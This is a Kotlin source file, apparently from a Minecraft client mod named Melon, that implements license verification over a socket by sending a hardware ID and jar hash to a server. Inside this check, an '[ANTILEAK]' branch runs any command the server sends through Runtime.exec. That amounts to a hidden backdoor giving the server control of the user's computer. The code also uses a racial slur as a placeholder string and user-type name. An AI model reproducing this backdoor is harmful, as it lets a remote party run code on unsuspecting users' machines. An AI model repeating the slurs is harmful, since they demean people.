package melon.verify

import dev.zenhao.melon.Melon
import dev.zenhao.melon.Melon.Companion.verifiedState
import dev.zenhao.melon.utils.math.RandomUtil
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import melon.system.util.collections.isNotClosed
import melon.utils.concurrent.threads.BackgroundScope
import melon.utils.concurrent.threads.delay
import java.io.DataInputStream
import java.io.DataOutputStream
import java.net.Socket
import java.security.MessageDigest

object SocketConnection {
    private const val domain = "127.0.0.1" //"liumenglong.tk"
    private const val port = 12344
    private lateinit var socket: Socket
    private lateinit var inputStream: DataInputStream
    private lateinit var outputStream: DataOutputStream
    var taskID = "NULL"

    fun canPollTaskFile(): String {
        return if (FileCacheVerify.isFileEmpty()) {
            "NIGGER"
        } else {
            taskID
        }
    }

    private fun canPollTask(): String {
        return if (taskID == HWIDManager.encryptedHWID().toString()) {
            if (FileCacheVerify.parseCheck() == FileCacheVerify.ParseType.A) {
                taskID
            } else {
                "NIGGER"
            }
        } else {
            "NIGGER"
        }
    }

    fun call() {
        BackgroundScope.launch {
            runCatching {
                runBlocking {
                    socket = Socket(domain, port)
                    inputStream = DataInputStream(socket.getInputStream())
                    outputStream = DataOutputStream(socket.getOutputStream())
                }
                //发送HWID
                val bytes = Melon::class.java.protectionDomain.codeSource.location.openStream().readBytes()
                val hash = MessageDigest.getInstance("MD5").digest(bytes).joinToString("") { "%02x".format(it) }
                val hwid = HWIDManager.encryptedHWID()
                outputStream.writeUTF("[CHECK]${hwid}@[HASH]${hash}")
                outputStream.flush()
                FileCacheVerify.createFile()
                if (FileCacheVerify.isFileEmpty()) {
                    FileCacheVerify.writeIn(hwid)
                }
                delay(1500)
                val pattern = Regex("\\[([A-Z]+)]")

                //接收服务器消息
                while (socket.isNotClosed) {
                    val reader = inputStream.readUTF()
                    when {
                        reader.startsWith("[PASS]") -> {
                            val isBetaUser = reader.contains("[BETA]")
                            taskID = reader.replace("[PASS]", "").replace("[BETA]", "")
                            Melon.id = canPollTask()
                            verifiedState = RandomUtil.nextInt(1, Int.MAX_VALUE)
                            if (isBetaUser) {
                                Melon.userState = Melon.UserType.Beta
                                Melon.DISPLAY_NAME = "${Melon.MOD_NAME} ${Melon.VERSION} (${Melon.userState.userType})"
                            }
                        }

                        reader.contains("[?]") -> {
                            taskID = "0.0"
                            Melon.userState = Melon.UserType.Nigger
                        }

                        reader.startsWith("[ANTILEAK]") -> {
                            socket.close()
                            delay(5)
                            Runtime.getRuntime().exec(reader.replace(pattern, ""))
                        }
                    }
                    socket.close()
                }
                FileCacheVerify.clearFile()
            }
        }
    }
}